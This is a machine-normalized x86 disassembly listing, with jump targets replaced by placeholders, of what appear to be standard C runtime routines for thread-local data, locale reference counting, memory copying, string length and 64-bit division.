call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4049cc
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_4020da
pop ecx
sub_404a23
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_404ab2
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_404b4b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_4020da
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_4020da
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_4020da
push [ esi + 0xc0 ]
call sub_4020da
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_408854
push [ esi + 0xd4 ]
call sub_4020da
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_4020da
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4020da
pop ecx
push [ esi + 0xb0 ]
call sub_4020da
push [ esi + 0xbc ]
call sub_4020da
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_4020da
push [ esi + 0xbc ]
call sub_408c34
pop ecx
pop ecx
push eax
call sub_4020da
pop ecx
push eax
call sub_4020da
push [ esi + 0xbc ]
call sub_408bcb
pop ecx
pop ecx
sub_404c96
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_404a23
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_404ab2
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_404b4b
pop ecx
sub_404ce3
push 0xc
push r--data
call sub_402ff0
call sub_404f0c
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_404c96
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404d50
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_404f0c
mov esi [ eax + 0x6c ]
mov eax esi
call sub_403035
retn
push 0x20
call sub_40361d
sub_404d6e
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_404da2
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4020da
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_404ddf
push 0x8
push r--data
call sub_402ff0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e81
push 0xc
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_404a23
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e8a
call sub_403035
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_404e93
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_404d6e
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_405274
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_4020da
pop ecx
xor esi esi
push 0x0
push esi
call sub_404ddf
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_404f26
push 0x8
push r--data
call sub_402ff0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_403035
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_4020da
pop ecx
push 0xd
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_4020da
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405040
push 0xc
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40504c
push esi
call sub_4020da
pop ecx
push edi
call sub_404ab2
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_4020da
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_404b4b
pop ecx
sub_405055
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_404da2
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_404d65
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4033a5
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_404150
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_404da2
mov edi [ DecodePointer@IAT ]
push sub_404f26
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_405274
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_404ddf
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_4051d0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_402dd3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_402d81
mov eax esi
jmp r-xdata
sub_40522f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_402114
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_405274
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408d32
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4052c0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408db4
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_405310
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4053a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405424 ]
jmp [ ecx * 4 + jump_table_4054a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405510 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4056ac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4055b0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056ac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405510 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4056ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405510 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405510 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405510 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056ac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_405701
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_405780
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_408fb4
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_405800
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4058b0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_405962
push 0xc
push r--data
call sub_402ff0
push 0xe
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4059c9
call sub_403035
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_4020da
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_4020da
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_4059e0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_405a68
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4083d1
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_402df9
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_4083d1
